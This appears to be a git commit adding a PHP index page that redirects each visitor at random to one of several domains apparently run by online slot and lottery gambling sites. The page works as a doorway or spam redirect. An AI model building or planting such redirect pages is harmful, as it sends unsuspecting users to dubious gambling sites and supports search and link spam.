fd4493bb6d6433e3908b0b848100291f46b73418
HASTALAVISTA <48452238+hastalavista8@users.noreply.github.com>
2024-08-30 12:13:48 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,16 @@
+<?php
+// Array of URLs to redirect to
+$urls = [
+    'https://sateslot77.store/',
+    'https://megaforwingacor.pro/',
+    'https://buditogel4d.online/',
+    // Add more URLs here
+];
+
+// Pick a random URL from the array
+$random_url = $urls[array_rand($urls)];
+
+// Redirect to the selected URL
+header("Location: $random_url");
+exit();
+?>
